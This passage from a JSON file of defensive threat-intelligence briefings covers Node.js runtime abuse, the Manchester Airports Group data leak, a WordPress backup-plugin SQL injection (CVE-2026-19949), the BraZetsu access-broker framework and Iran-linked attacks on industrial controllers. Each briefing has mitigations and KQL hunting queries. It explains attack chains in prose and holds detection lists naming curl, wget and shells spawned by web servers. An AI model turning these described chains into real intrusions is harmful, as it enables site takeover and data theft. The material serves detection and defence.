   },
   {
    "type": "Behavior",
    "value": "Download and silent install of the official Node.js installer from nodejs.org mid-intrusion",
    "note": "Ingress tool transfer of a legitimate signed runtime, following blocked AdaptixC2 and Cobalt Strike deployments"
   },
   {
    "type": "Behavior",
    "value": "ClickFix or fake-CAPTCHA paste-and-run command execution preceding node.exe activity",
    "note": "Initial access technique across the reported campaigns, including the CrashFix variant"
   }
  ],
  "iocNote": "Symantec published named tooling and one C2 identifier but no hashes, addresses or domain list in the reporting reviewed, and the Ethereum gateways used for EtherHiding are legitimate services that cannot be blocklisted wholesale. Hunt on the behaviour: an unexpected Node.js installation, node.exe running scripts outside a development context, Run-key persistence pointing at it, and its network egress.",
  "mitigation": [
   "Inventory where Node.js is installed and remove or restrict it where there is no development requirement. This is the control the technique depends on, and it is a policy change rather than a patch.",
   "Apply application-control rules that constrain which scripts node.exe may execute and from where, rather than allow-listing the signed binary and stopping there.",
   "Block the ClickFix entry point: restrict Run dialog and clipboard paste-to-terminal workflows where policy allows, and brief users that a website instructing them to paste a command into Windows is an attack.",
   "Alert on Run-key writes referencing interpreters, including node.exe, and on services that launch PowerShell downloaders.",
   "Review egress to blockchain gateway endpoints from server and workstation processes. Legitimate business use is rare outside specific teams and is the EtherHiding channel here.",
   "Given Woodgnat's ransomware associations, treat any confirmed node.exe implant as pre-ransomware access: hunt for credential theft and lateral movement rather than removing the implant alone."
  ],
  "response": [
   "DEFENDER XDR KQL — the technique's shape in three parts: node.exe running a script from a user-writable path, its persistence, and its egress. Enrichment technique adapted from community work: github.com/SlimKQL/Hunting-Queries-Detection-Rules (Steven Lim, LinkedIn @0x534c).\n\n// Node.js runtime abuse — execution, persistence and C2 legs\nlet since = datetime(2026-02-01);\nlet suspectPaths = dynamic([\"\\\\users\\\\\",\"\\\\appdata\\\\\",\"\\\\programdata\\\\\",\"\\\\temp\\\\\",\"\\\\public\\\\\"]);\nunion isfuzzy=true\n  (DeviceProcessEvents\n   | where Timestamp > since\n   | where FileName =~ \"node.exe\"\n   | where ProcessCommandLine has_any (suspectPaths) or ProcessCommandLine has_any (\".js\",\"-e \",\"--eval\")\n   | project Timestamp, DeviceName, AccountName, Leg = \"execution\", Evidence = strcat(InitiatingProcessFileName, \" -> \", ProcessCommandLine)),\n  (DeviceRegistryEvents\n   | where Timestamp > since\n   | where RegistryKey has \"CurrentVersion\\\\Run\"\n   | where RegistryValueData has \"node\"\n   | project Timestamp, DeviceName, AccountName = InitiatingProcessAccountName, Leg = \"persistence\", Evidence = strcat(RegistryKey, \" = \", RegistryValueData)),\n  (DeviceNetworkEvents\n   | where Timestamp > since\n   | where InitiatingProcessFileName =~ \"node.exe\"\n   | where RemoteUrl has_any (\"infura\",\"alchemy\",\"quicknode\",\"ankr\",\"cloudflare-eth\",\"datalyerservice\") or RemoteUrl has \"eth\"\n   | project Timestamp, DeviceName, AccountName = InitiatingProcessAccountName, Leg = \"c2\", Evidence = strcat(RemoteUrl, \" \", RemoteIP))\n| summarize Legs = make_set(Leg), Events = count(), Detail = make_set(Evidence, 8) by DeviceName, AccountName\n| extend Confidence = iff(array_length(Legs) > 1, \"multi-leg — investigate\", \"single leg\")\n| sort by Events desc",
   "SENTINEL KQL — the same hunt where Node.js has no business being installed, joined against installation events so an unexpected runtime and its use surface together; union isfuzzy keeps it working with partial connectors.\n\n// Unexpected Node.js installation and subsequent use\nlet since = datetime(2026-02-01);\nlet installs =\n  union isfuzzy=true\n    (DeviceProcessEvents\n     | where Timestamp > since\n     | where ProcessCommandLine has \"node-v\" and ProcessCommandLine has_any (\".msi\",\"/quiet\",\"/qn\")\n     | project Timestamp, DeviceName, Evidence = ProcessCommandLine),\n    (DeviceFileEvents\n     | where Timestamp > since\n     | where FileName startswith \"node-v\" and FileName endswith \".msi\"\n     | project Timestamp, DeviceName, Evidence = strcat(FolderPath, FileName));\nlet usage =\n  DeviceProcessEvents\n  | where Timestamp > since\n  | where FileName =~ \"node.exe\"\n  | summarize Runs = count(), FirstRun = min(Timestamp), Cmds = make_set(ProcessCommandLine, 5) by DeviceName;\ninstalls\n| join kind=leftouter (usage) on DeviceName\n| project InstallTime = Timestamp, DeviceName, Installer = Evidence, FirstRun, Runs, Cmds\n| sort by InstallTime desc",
   "Where node.exe activity is found, pull the script it was pointed at before killing the process. The implant is the script, not the binary, and it is the only copy of the attacker's logic on disk.",
   "Check for the June 2026 tooling in the same environments: the NexShield Chrome extension, GateKeeper .NET payloads and ModeloRAT or Mistic artefacts. Symantec attributes them to the same broker."
  ],
  "source": "Symantec Threat Hunter Team / security.com (Sep 3, 2026), The Hacker News, Cyber Recaps, OffSeq Threat Radar, Zscaler ThreatLabz (C2Looper), GuidePoint Security",
  "sourceNote": "Feb 2026 – Sep 4, 2026"
 },
 "magleak": {
  "eyebrow": "Manchester Airports Group · FulcrumSec · ~8.7M people · Data published Sep 2, 2026",
  "title": "A refused ransom, a published database, and an access path that was in the page source",
  "tags": [
   [
    "crit",
    "Transportation Systems"
   ],
   [
    "high",
    "Commercial Facilities"
   ]
  ],
  "overview": "Two things in this case are operationally useful to other organisations. The first is the claimed access path: FulcrumSec told BleepingComputer it used Iterable API credentials found in the client-side JavaScript of all three airport websites — an exposure that no perimeter control or endpoint agent would have surfaced, and that any organisation can check for itself today by reading its own front-end bundles. MAG has not confirmed that path. The second is the outcome of refusal: MAG declined the demand, in line with NCSC advice, and the group published the entire dataset for free, which Huntress's Muhammad Yahya Patel described as a marketing campaign aimed at every other organisation watching. Note that source figures on volume do not agree, and that FulcrumSec's own claims about contents exceed what MAG disclosed.",
  "technical": [
   "MAG disclosed the incident on Aug 27, 2026, following discovery of unauthorised access around Aug 25. Approximately 8.7 million customers were affected across Manchester, London Stansted and East Midlands airports.",
   "Data in scope per MAG: email addresses, phone numbers, vehicle registrations and postcodes, drawn from car park, lounge and Fast Track bookings and in-airport Wi-Fi sign-ups. MAG states the affected system does not store bank details, payment card data, account passwords or passport numbers, and that airport operations were unaffected. The database was hosted by a third party.",
   "FulcrumSec claimed the breach on Aug 30 in BleepingComputer's reporting, describing approximately 86 GB of compressed data, and published the dataset on its leak site on Sep 2, 2026 after MAG refused the demand.",
   "Volume figures differ by source: SecurityWeek reports roughly 550 GB uncompressed and Computer Weekly half a terabyte; BleepingComputer reports FulcrumSec saying the 86 GB figure reflected its own compression and that the exported files total roughly 640 GB extracted; Hackread counts four archives adding to 74.5 GB compressed. Have I Been Pwned lists email addresses and phone numbers for 8.8 million people.",
   "FulcrumSec's listing claims names, emails, phone numbers, town and postal region and residential IP addresses; further reporting describes booking history, travel dates, vehicle information, purchase references and customer profiles, which TrendAI's David Sancho characterised as a major escalation over what MAG had disclosed.",
   "Claimed access path: exposed Iterable API credentials present in client-side JavaScript in each of the three airports' root domains, used to reach MAG's backend customer and marketing systems. This is FulcrumSec's account to BleepingComputer; MAG has not publicly confirmed it.",
   "The group said it was considering withholding roughly 200,000 upcoming-travel records on real-world-harm grounds, a caveat it also exercised during its Novo Nordisk extortion in June 2026. Whether it did so is not established in the reporting reviewed.",
   "Actor profile per TechTimes: FulcrumSec active since approximately September 2025, roughly 25 claimed victims across 11 countries, a data-theft and extortion model with no ransomware encryption, focused on rapid cloud-platform exfiltration. In June 2026 it published two caches of Novo Nordisk material after a $25 million demand was refused."
  ],
  "iocs": [
   {
    "type": "Actor Alias",
    "value": "FulcrumSec",
    "note": "Extortion group claiming the MAG breach; active since approximately September 2025, ~25 victims across 11 countries, no encryption stage"
   },
   {
    "type": "Behavior",
    "value": "Third-party marketing or customer-engagement API credentials present in client-side JavaScript on public web properties",
    "note": "Claimed initial access path at MAG (Iterable API keys in front-end code on three root domains); checkable in your own bundles without any vendor telemetry"
   }
  ],
  "iocNote": "No hashes, addresses or malware indicators exist for this incident — there is no malware stage. The access path is credential exposure in published web code and the exfiltration ran through a legitimate third-party API, so detection depends on API-side logging held by the SaaS provider rather than on endpoint or network telemetry. The actor's claims about volume and contents are unverified and disagree with MAG's disclosure.",
  "mitigation": [
   "Search your own public front-end bundles for API keys and tokens, including those for marketing, analytics and customer-engagement platforms. This is the claimed access path and it costs one pass over your own JavaScript to check.",
   "Move any third-party API call that requires a privileged key behind a server-side proxy, and scope keys that must be client-side to read-only, origin-restricted use.",
   "Rotate credentials for hosted customer-data platforms and enable API access logging and rate limits with the vendor. Bulk export through a valid key is the exfiltration shape here.",
   "Add secret scanning to CI for web assets, not only for repositories of server code — the exposure in this case shipped to production as part of the site.",
   "Inventory which third parties hold customer contact data on your behalf and confirm what their logs would show if a key were abused. MAG's affected database was hosted by a third party.",
   "For customer-facing risk: the published dataset pairs contact details with travel and vehicle information, which supports targeted phishing and vishing against affected individuals. Brief fraud and service-desk teams accordingly."
  ],
  "response": [
   "No hunting query applies to this incident on the defender side: there is no malware, no endpoint artefact and no network indicator, and the exfiltration ran through a legitimate third-party API using valid credentials. The equivalent work is a review, not a query — inventory client-side secrets in your own web properties and request API audit logs from the platforms that hold your customer data.",
   "If your organisation uses Iterable or a comparable customer-engagement platform, ask the vendor for API access logs covering key usage by address and volume, and compare against your own expected callers. Bulk reads from an address outside your infrastructure are the signal.",
   "Treat published customer contact data as active phishing input. Where you hold a copy of an affected population, expect targeted lures referencing genuine bookings and vehicle registrations."
  ],
  "source": "MAG statements via BBC, SecurityWeek, BleepingComputer, Computer Weekly, Cybernews, TechRadar, TechTimes, Have I Been Pwned",
  "sourceNote": "Aug 25 – Sep 4, 2026"
 },
 "wpmigration": {
  "eyebrow": "All-in-One WP Migration and Backup · CVE-2026-19949 · CVSS 8.8 · Patched 7.110 on Aug 20, 2026",
  "title": "A dormant trackback payload that fires when the administrator runs a backup",
  "tags": [
   [
    "high",
    "Commercial Facilities"
   ],
   [
    "high",
    "Information Technology"
   ]
  ],
  "overview": "The interesting property here is the trigger, not the injection. The payload is submitted through a public channel as ordinary trackback data, so it passes WAF inspection and sits inert in the database; execution happens later, on an action the administrator initiates deliberately. That inverts the usual detection assumption — there is no attack traffic at the moment of compromise, and the request that causes execution is a legitimate authenticated one. The second property that matters is patch lag: the fix shipped on Aug 20, thirteen days before Wordfence's public write-up, and roughly 3.25 million of the five million-plus installs had still not applied it when the details and a weaponised proof-of-concept were both in circulation. Anyone who ran an export or restore on an unpatched site after mid-August should treat that operation as the point to investigate, and rotate the plugin secret regardless of whether artefacts are found.",
  "technical": [
   "CVE-2026-19949, CVSS 8.8 per Wordfence: unauthenticated second-order SQL injection in ServMask's All-in-One WP Migration and Backup, affecting all versions through 7.109. Fixed in 7.110, released Aug 20, 2026.",
   "Root cause: the plugin's vendored database class builds SQL fragments by string concatenation and the import routines do not consistently sanitise callers' input. During archive restoration the plugin rewrites stored database content — URLs and table prefixes — and incorrectly parses escaped backslashes and quotation marks, so stored data breaks out of the intended query context (CWE-89).",
   "Delivery: an unauthenticated attacker plants crafted data through a public WordPress input channel such as a trackback. Nothing executes at submission time; the payload passes WAF inspection as ordinary comment data and is written to the database dormant.",
   "Trigger: an administrator runs an export, import or restore — the plugin's core function — and the stored data is reprocessed as SQL.",
   "Escalation: the injected SQL can write the plugin's ai1wm_secret_key to a publicly readable location such as a comment. With that key an attacker can drive the plugin's own import path without valid credentials and unpack a malicious .wpress archive containing executable code, reaching remote code execution and site takeover.",
   "Install base and patch state per Wordfence and Tech Times: more than five million active installations; about 35 percent patched as of Sep 2, 2026, leaving roughly 3.25 million sites exposed.",
   "Reporting: found by security researcher Jack Taylor, reported mid-August 2026 through Wordfence's bug bounty programme with a 5,761 dollar award. Wordfence published full technical disclosure on Sep 2, 2026.",
   "Exploit availability: as of Sep 3, SOCRadar records one public proof-of-concept repository with one variant marked weaponised, and classifies exploitation as reported but without independent confirmation in its sources. SentinelOne's entry states no public PoC is listed on its side — the two disagree.",
   "Scoring note: the description refers to unauthenticated attackers while the CVSS vector indicates a low privilege requirement (PR:L). The discrepancy sits in the source advisory; the practical reading is that the injection stage needs no account and the trigger stage needs an administrator to act."
  ],
  "iocs": [
   {
    "type": "String",
    "value": "ai1wm_secret_key",
    "note": "Plugin secret leaked by the injection. Its appearance in comment, trackback or other publicly readable content is the highest-value artefact"
   },
   {
    "type": "Filename",
    "value": "*.wpress",
    "note": "Plugin archive format. An unexplained .wpress upload or import after mid-August 2026 is the code-execution stage"
   },
   {
    "type": "Behavior",
    "value": "Trackback or pingback rows containing escaped backslashes or quotation marks adjacent to SQL syntax",
    "note": "The dormant payload as stored in the database, per Wordfence's description of the parsing failure"
   },
   {
    "type": "Behavior",
    "value": "Archive export, import or restore on an unpatched instance after Aug 20, 2026",
    "note": "The trigger event. Legitimate and administrator-initiated, so it must be correlated with the stored data rather than treated as suspicious by itself"
   }
  ],
  "iocNote": "No addresses, hashes or domains have been published. Wordfence's disclosure is a vulnerability write-up, not incident reporting, and no vendor has published campaign infrastructure. The indicators above are the mechanics of the flaw as the advisories describe them, usable for hunting on your own sites; they are not attributed to an observed intrusion set. Do not expect attack traffic at the time of compromise — the injection arrives as ordinary trackback data.",
  "mitigation": [
   "Update All-in-One WP Migration and Backup to 7.110 or later. This is the whole fix for the injection path.",
   "Rotate ai1wm_secret_key on any instance that ran an export, import or restore while on 7.109 or earlier. The key may already have been written somewhere publicly readable.",
   "Review trackback, pingback and comment rows created before the update for payload-shaped content, and review recent .wpress uploads and import history against your own change records.",
   "Where trackbacks are not needed, disable them. It closes the delivery channel used here and is a low-cost configuration change.",
   "Do not rely on the WAF for this one. The payload is submitted as ordinary trackback data specifically to pass inspection, and the malicious request never resembles SQL injection in flight.",
   "If a site is judged compromised, treat it as code execution on the host: review files written since the import, rotate database and hosting credentials, and check for added administrator users."
  ],
  "response": [
   "DEFENDER XDR KQL — the code-execution stage is a web server process spawning children or writing PHP, which is the reliable signal on the host after a malicious .wpress import. Attribution technique adapted from community work: github.com/Bert-JanP/Hunting-Queries-Detection-Rules (Bert-Jan Pals, kqlquery.com).\n\n// CVE-2026-19949 — post-import code execution on WordPress hosts\nlet webProcs = dynamic([\"php-fpm\",\"php\",\"httpd\",\"apache2\",\"nginx\",\"w3wp.exe\"]);\nlet since = datetime(2026-08-20);\nunion isfuzzy=true\n  (DeviceProcessEvents\n   | where Timestamp > since\n   | where InitiatingProcessFileName has_any (webProcs)\n   | where FileName has_any (\"sh\",\"bash\",\"cmd.exe\",\"powershell.exe\",\"curl\",\"wget\",\"python3\")\n   | project Timestamp, DeviceName, Evidence = strcat(InitiatingProcessFileName, \" -> \", FileName, \" \", ProcessCommandLine)),\n  (DeviceFileEvents\n   | where Timestamp > since\n   | where InitiatingProcessFileName has_any (webProcs)\n   | where FileName endswith \".php\" or FileName endswith \".wpress\"\n   | project Timestamp, DeviceName, Evidence = strcat(ActionType, \" \", FolderPath, FileName))\n| sort by Timestamp desc",
   "SENTINEL KQL — the two halves of the chain in web logs: trackback submissions that plant the payload, and the plugin's own admin-ajax export/import calls that trigger it. Correlating the two is what dates the incident.\n\n// CVE-2026-19949 — trackback plant and plugin export/import trigger\nlet since = datetime(2026-08-01);\nlet plant =\n  W3CIISLog\n  | where TimeGenerated > since\n  | where csUriStem has_any (\"/wp-trackback.php\", \"xmlrpc.php\", \"wp-comments-post.php\")\n  | project PlantTime = TimeGenerated, Site = sSitename, Src = cIP, Uri = csUriStem;\nlet trigger =\n  W3CIISLog\n  | where TimeGenerated > since\n  | where csUriStem has \"admin-ajax.php\"\n  | where csUriQuery has_any (\"ai1wm\", \"wpress\", \"export\", \"import\")\n  | project TriggerTime = TimeGenerated, Site = sSitename, Query = csUriQuery;\ntrigger\n| join kind=leftouter (plant) on Site\n| where PlantTime < TriggerTime\n| project TriggerTime, Site, Query, PlantTime, PlantSrc = Src, PlantUri = Uri\n| sort by TriggerTime desc",
   "Query the database directly for the leaked key rather than waiting for telemetry: search comment and postmeta content for the string ai1wm_secret_key. A hit means the injection succeeded on that site.",
   "Check whether the site's .wpress import history matches your own records. The plugin's import path is the code-execution step, and it is driven with a valid secret key, so it will look authorised in application logs."
  ],
  "source": "Wordfence (technical disclosure, Sep 2, 2026), BleepingComputer, SC Media, GBHackers, SOCRadar, SentinelOne vulnerability database, Sucuri patch roundup",
  "sourceNote": "Aug 20 – Sep 3, 2026"
 },
 "brazetsu": {
  "eyebrow": "BraZetsu · Exilware · Group-IB · First seen early May 2026",
  "title": "A framework built to grade compromised hosts for resale, not to steal from them",
  "tags": [
   [
    "high",
    "Financial Services"
   ],
   [
    "med",
    "Critical Manufacturing"
   ]
  ],
  "overview": "Group-IB's framing is the useful part: this is initial-access-broker tooling, so the reconnaissance is the product. BraZetsu inventories what a host can reach — banking clients, ERP platforms, SCADA, DevOps secrets, certificates — and uses that inventory to price marketplace access, which means the compromise you detect is a precursor to a second actor arriving with their own objectives. For defenders outside Brazil and Iberia the immediate relevance is limited, but the CNAB and certificate-hunting behaviour transfers: any framework that grades hosts by financial reach will look for bulk-payment files and code-signing material. Two practical constraints on this record: no hashes or addresses were published in the reporting reviewed, and Group-IB notes some samples were fully undetected on VirusTotal at analysis time, so signature coverage is not a control here.",
  "technical": [
   "BraZetsu is a modular Python framework targeting Windows, first seen in early May 2026, attributed by Group-IB to the Brazilian threat actor Exilware. Analysts: Julio Guapo Menezes and Miguel Salazar.",
   "Purpose: rather than the standard infostealer model, the framework catalogues compromised systems as tradable assets on an underground marketplace, allowing buyers to run their own malware or tooling on hosts without establishing the initial foothold themselves.",
   "Reconnaissance spans more than twenty categories including banking systems, ERP platforms (TOTVS, SAP, Sankhya, Senior), SCADA infrastructure, government systems and cryptocurrency platforms. Group-IB states the AI-driven assessment evaluates commercial potential through hardware profiling, software environment analysis and network infrastructure mapping, so access can be categorised and priced automatically.",
   "Collection: .pfx and .p12 digital certificates including those in user profiles and OneDrive locations; browser history from Chrome, Edge, Brave, Vivaldi and Opera, compared against a list of nearly 230 targeted domains and paths; screen captures to track user behaviour; and financial files.",
   "CNAB targeting: the framework searches local and network directories for Brazilian CNAB remittance files, the format organisations use to send bulk payment instructions to banks. Their presence is itself a signal that the endpoint is connected to financial operations.",
   "Related tooling: Group-IB identifies similarities to CNABHunter, a Python tool that parses CNAB transaction data, sends payment metadata to attacker infrastructure, and can modify legitimate payment details inside CNAB files — replacing them with attacker-controlled bank accounts, PIX keys or barcodes.",
   "Attribution linkage: Group-IB assesses with high confidence, on shared codebase, identical build methodology, overlapping functionality, common infrastructure and equivalent payload architecture, that BraZetsu and the Python backdoor AgenteV2 are the same initial-access framework. One BraZetsu IP address was previously linked to AgenteV2 campaigns phishing Brazilian users with messages impersonating judicial summonses. AgenteV2 can stream a victim's screen in real time, letting operators watch for banking sessions.",
   "Scope: recent versions focus on Brazilian infrastructure while retaining multi-region capability; operational calibration is toward Iberian and Latin American corporate, financial, industrial and law-enforcement environments. Access has also been advertised for compromised systems in the United States.",
   "Development signals: verbose Portuguese-language logging, emoji-heavy status messages and development artefacts that Group-IB reads as extensive use of generative AI during development. Some samples were fully undetected on VirusTotal at the time of analysis."
  ],
  "iocs": [
   {
    "type": "Actor Alias",
    "value": "Exilware",
    "note": "Brazilian threat actor Group-IB assesses develops and maintains the framework"
   },
   {
    "type": "String",
    "value": "AgenteV2",
    "note": "Python backdoor Group-IB assesses with high confidence is the same framework as BraZetsu"
   },
   {
    "type": "String",
    "value": "CNABHunter",
    "note": "Related Python tool that parses and tampers with CNAB payment files"
   },
   {
    "type": "Behavior",
    "value": "Suspicious VBScript execution followed by scheduled-task creation or registry Run-key persistence",
    "note": "Persistence pattern named in the reporting"
   },
   {
    "type": "Behavior",
    "value": "Outbound TLS traffic over TCP port 8443 from a workstation",
    "note": "Command-and-control channel named in the reporting; no addresses published"
   },
   {
    "type": "Behavior",
    "value": "Browser database files copied into temporary directories",
    "note": "History extraction stage across Chrome, Edge, Brave, Vivaldi and Opera"
   },
   {
    "type": "Filename",
    "value": "*.pfx, *.p12",
    "note": "Digital certificates collected from user profiles and OneDrive locations"
   },
   {
    "type": "Behavior",
    "value": "Directory enumeration for CNAB remittance files across local and network paths",
    "note": "Financial-reach assessment stage; also the CNABHunter tampering target"
   }
  ],
  "iocNote": "No hashes, addresses or domains appear in the reporting reviewed. Group-IB's public blog and the derivative coverage describe behaviour and tooling relationships; the report references one IP address shared with AgenteV2 campaigns but does not publish its value. The indicators above are therefore behavioural and string-based, adequate for hunting but not for blocking. Group-IB also states some samples were fully undetected on VirusTotal at analysis time, so hash-based detection would be weak even if hashes were available.",
  "mitigation": [
   "Treat this as an access-broker problem rather than a banking-malware problem: a detected BraZetsu infection means the host has been graded and may already be listed for sale, so the response is eviction plus credential rotation, not cleanup alone.",
   "Inventory where CNAB remittance files and .pfx or .p12 certificates live, including OneDrive-synced user profiles, and restrict access to the accounts that genuinely need them. The framework's value assessment depends on finding them.",
   "Block or alert on script-host execution from user-writable paths, and monitor scheduled-task and Run-key creation — the persistence mechanisms named in the reporting.",
   "Constrain outbound traffic from workstations to known destinations. TLS on 8443 from an ordinary endpoint has few legitimate uses and is the channel described.",
   "Where CNAB files are generated or transmitted, verify payment details out of band before submission to the bank. CNABHunter's documented capability is silent modification of bank accounts, PIX keys and barcodes inside otherwise valid files.",
   "For hosts with ERP, SCADA, DevOps secrets or certificate access, assume a higher targeting priority: those are precisely the attributes the framework prices upward."
  ],
  "response": [
   "DEFENDER XDR KQL — the persistence and collection behaviour together, since no hashes were published. IPTags enrichment pattern adapted from community work: github.com/SlimKQL/Hunting-Queries-Detection-Rules (Steven Lim, @0x534c).\n\n// BraZetsu — VBScript execution, persistence and certificate or CNAB collection\nlet since = datetime(2026-05-01);\nunion isfuzzy=true\n  (DeviceProcessEvents\n   | where Timestamp > since\n   | where FileName in~ (\"wscript.exe\",\"cscript.exe\",\"mshta.exe\") or ProcessCommandLine has \".vbs\"\n   | where InitiatingProcessFileName !in~ (\"gpscript.exe\")\n   | project Timestamp, DeviceName, Stage = \"script exec\", Evidence = ProcessCommandLine),\n  (DeviceRegistryEvents\n   | where Timestamp > since\n   | where RegistryKey has @\"\\CurrentVersion\\Run\"\n   | where ActionType in (\"RegistryValueSet\",\"RegistryKeyCreated\")\n   | project Timestamp, DeviceName, Stage = \"run key\", Evidence = strcat(RegistryValueName, \" = \", RegistryValueData)),\n  (DeviceFileEvents\n   | where Timestamp > since\n   | where FileName endswith \".pfx\" or FileName endswith \".p12\" or FileName in~ (\"History\",\"Web Data\",\"Login Data\")\n   | where FolderPath has_any (@\"\\Temp\\\", @\"\\AppData\\Local\\Temp\")\n   | project Timestamp, DeviceName, Stage = \"collection\", Evidence = strcat(ActionType, \" \", FolderPath, FileName))\n| summarize stages = make_set(Stage), events = count(), first = min(Timestamp), last = max(Timestamp) by DeviceName\n| where array_length(stages) > 1\n| sort by last desc",
   "SENTINEL KQL — the named C2 channel, enriched with Defender for Cloud Apps threat intel so a hit carries context rather than just a port match. Enrichment technique adapted from github.com/SlimKQL/Hunting-Queries-Detection-Rules (Steven Lim, @0x534c).\n\n// BraZetsu — outbound TLS on 8443 from workstations, enriched\nlet since = datetime(2026-05-01);\nunion isfuzzy=true\n  (CommonSecurityLog\n   | where TimeGenerated > since\n   | where DestinationPort == 8443\n   | where DeviceAction !in~ (\"deny\",\"drop\",\"denied\",\"blocked\")\n   | project TimeGenerated, Src = SourceIP, Dst = DestinationIP, Bytes = toint(SentBytes)),\n  (DeviceNetworkEvents\n   | where Timestamp > since\n   | where RemotePort == 8443 and ActionType == \"ConnectionSuccess\"\n   | project TimeGenerated = Timestamp, Src = DeviceName, Dst = RemoteIP, Bytes = 0)\n| summarize connections = count(), bytes = sum(Bytes), first = min(TimeGenerated), last = max(TimeGenerated) by Src, Dst\n| join kind=leftouter (\n    CloudAppEvents\n    | where Timestamp > since\n    | extend RawIP = tostring(RawEventData.ClientIP), IPTags = todynamic(tostring(RawEventData.IPTags))\n    | where IPTags has_any (\"Brute force attacker\", \"Password spray attacker\", \"malicious\", \"Possible Hackers\", \"Tor\")\n    | summarize Tags = make_set(IPTags) by Dst = RawIP\n  ) on Dst\n| project Src, Dst, connections, bytes, first, last, Tags\n| sort by connections desc",
   "Hunt for CNAB directory enumeration where those files exist: a process walking local and network paths for remittance files is not normal finance-user behaviour, and it is the framework's value-assessment step.",
   "Where a host is confirmed infected, treat every certificate and browser-stored session it held as exposed and reissue rather than review — the collection stage precedes the sale, so the buyer inherits whatever was taken."
  ],
  "source": "Group-IB — Anatomy of BraZetsu (Julio Guapo Menezes, Miguel Salazar); The Hacker News; GBHackers",
  "sourceNote": "Sep 1–3, 2026"
 },
 "iranot": {
  "eyebrow": "Iran-linked · Energy and Water/Wastewater · OT impact · UK NCSC, FBI, CISA",
  "title": "A four-day outage at a small UK generator and wastewater disruption across twelve US states, in the same window",
  "overview": "The reason to carry this as an OT story rather than a geopolitics story is the mechanism the reporting describes: not malware on servers, but controller-level actions — operator passwords changed and controllers disconnected — with physical consequences in the form of flooding and lost water pressure. The UK case is described by officials as small and contained; the point researchers make is intent. For defenders, the actionable content is the exposure pattern, since the same reporting says attackers found far more reachable controllers in water than in power.",
  "technical": [
   "UK: a small electricity generator was forced offline for four days. The plant was not named for security reasons, was restored by its own staff, and the incident was reported to the National Cyber Security Centre. Reporting describes it as the first confirmed cyberattack of its kind against UK energy infrastructure.",
   "UK government position: Energy Minister Michael Shanks said there was \"no threat to the wider grid and nobody lost power\", described the generator as \"tiny\", and said his department had briefed CEOs on steps to stay secure.",
   "US: dozens of wastewater treatment plants across twelve states were affected, with flooding and loss of water pressure reported. The FBI attributed the incidents to malicious cyber actors; US government sources said the threat likely originated in Iran.",
   "Scope reporting differs by date: Foreign Policy reported on Aug 13 that providers in at least seven states were targeted over a two-week campaign, with FBI, EPA and CISA officials indicating as many as a dozen states could be affected. Earlier reporting counted more than 30 community water systems in Minnesota.",
   "Targeted component class: programmable logic controllers used to manage the flow and chemical composition of water supplies. CISA's Jul 30, 2026 advisory states that in many cases the attackers \"modified passwords to lock out operators and disconnected the controllers\", forcing some facilities to switch to manual operation.",
   "Structural asymmetry named in the reporting: water utilities face no binding federal cybersecurity requirements backed by financial penalties, unlike electricity providers, and a volunteer defence programme had reached only 21 of approximately 50,000 unprotected small utilities.",
   "Context given by the coverage: Iran has increased cyber operations against Western countries since February, with activity reported in several European nations, and the UK incident follows CISA's Aug 19 advisory on AI-generated Siemens PLC reconnaissance."
  ],
  "iocs": [],
  "iocNote": "No indicators have been published for either the UK incident or the US water campaign in the reviewed sources. The UK plant is deliberately unnamed and the FBI attribution statement carries no technical detail, so detection has to be built on exposure and behaviour rather than on indicators.",
  "mitigation": [
   "Enumerate every controller management path that is reachable from the internet — HMI web interfaces, vendor remote-support tunnels, cellular modems and engineering workstations — and remove that reachability. This is the exposure the reporting describes attackers finding at scale in the water sector.",
   "Change default and shared credentials on controllers and HMIs, and hold operator accounts in a system that cannot be locked out from the controller itself; password modification and controller disconnection are the two actions CISA named.",
   "Exercise manual-operation fallback rather than assuming it. Facilities in the US campaign switched to manual operation, which is only a mitigation where staff have practised it.",
   "Alert on configuration writes, program downloads and mode changes on controllers, and treat an unexplained controller disconnection as a security event, not only as a reliability event.",
   "For UK operators: NCSC reporting and the DESNZ CEO briefing referenced in the coverage are the route to sector-specific guidance."
  ],
  "response": [
   "SENTINEL KQL — external sources reaching OT protocol ports through the perimeter firewall, the exposure pattern the reporting describes. Adapt the OT address ranges to your own plant networks.\n\nlet otPorts = dynamic([502, 102, 20000, 44818, 47808, 4840, 1911, 9600]);\nunion isfuzzy=true\n  (CommonSecurityLog\n   | where TimeGenerated > ago(30d)\n   | where DestinationPort in (otPorts)\n   | project TimeGenerated, SourceIP, DestinationIP, DestinationPort, DeviceAction, Activity=DeviceEventClassID),\n  (AzureNetworkAnalytics_CL\n   | where TimeGenerated > ago(30d)\n   | extend DestinationPort = toint(DestPort_d), SourceIP = tostring(SrcIP_s), DestinationIP = tostring(DestIP_s)\n   | where DestinationPort in (otPorts)\n   | project TimeGenerated, SourceIP, DestinationIP, DestinationPort, DeviceAction=tostring(FlowStatus_s), Activity=\"AzureFlow\")\n| where not(ipv4_is_private(SourceIP))\n| summarize attempts = count(), ports = make_set(DestinationPort, 10), firstSeen = min(TimeGenerated), lastSeen = max(TimeGenerated) by SourceIP, DestinationIP\n| order by attempts desc\n// Technique borrowed from the union isfuzzy multi-connector pattern published by Bert-Jan Pals (github.com/Bert-JanP/Hunting-Queries-Detection-Rules) so the query survives a missing connector.",
   "SENTINEL KQL — engineering-workstation and HMI sign-ins from outside the plant, plus account lockouts on those hosts, to catch the operator-lockout action CISA described. Replace the host prefix with your own naming.\n\nlet otHosts = SigninLogs\n  | where TimeGenerated > ago(30d)\n  | where DeviceDetail.displayName has_any (\"HMI\", \"SCADA\", \"ENGWS\", \"PLC\")\n  | distinct tostring(DeviceDetail.displayName);\nunion isfuzzy=true\n  (SigninLogs\n   | where TimeGenerated > ago(30d)\n   | where tostring(DeviceDetail.displayName) in (otHosts)\n   | project TimeGenerated, Account=UserPrincipalName, Host=tostring(DeviceDetail.displayName), IPAddress, ResultType, Location=tostring(LocationDetails.countryOrRegion)),\n  (SecurityEvent\n   | where TimeGenerated > ago(30d)\n   | where EventID in (4740, 4723, 4724)\n   | where Computer has_any (\"HMI\", \"SCADA\", \"ENGWS\", \"PLC\")\n   | project TimeGenerated, Account=TargetAccount, Host=Computer, IPAddress=IpAddress, ResultType=tostring(EventID), Location=\"onprem\")\n| summarize events = count(), types = make_set(ResultType, 10), locations = make_set(Location, 10) by Account, Host\n| order by events desc",
